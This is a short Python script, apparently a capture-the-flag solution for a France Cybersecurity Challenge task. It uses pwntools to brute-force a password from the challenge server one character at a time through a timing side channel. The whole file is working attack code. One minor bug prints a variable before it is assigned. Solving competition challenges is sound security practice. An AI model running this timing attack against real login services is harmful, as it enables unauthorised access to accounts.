#!/usr/bin/env python3

import time
import string
from pwn import *

context.log_level = 'warn'
host = "challenges2.france-cybersecurity-challenge.fr"
port = 6006

dico = string.ascii_letters + string.digits + string.punctuation
print("[*] Dico is {}".format(dico))

passwd = ""
curr = 0

over = False

while not over:
    arr = []
    times = []

    for l in dico:
        trying = passwd + l
        print("[+] Trying {}".format(trying))
        r = remote(host, port)
        start = time.time()
        try:
            r.sendline(trying)
        except Exception:
            pass
        try:
            resp = r.recvuntil("incorrect !")
        except EOFError:
            print(resp)
            print(r.clean)
            over = True
            break
        end = time.time()
        times.append(end - start)
        arr.append("{} -> {} seconds".format(l, end - start))
        r.close()

    m = 0
    im = 0
    for i in range(len(times)):
        if times[i] > m:
            m = times[i]
            im = i

    oldcurr = curr
    curr += times[im]
    passwd += arr[im][0]
    print("[x] Pass is {} and current time is {} secs (+ {} secs)".
            format(passwd, str(curr)[:4], str(curr-oldcurr)[:4]))
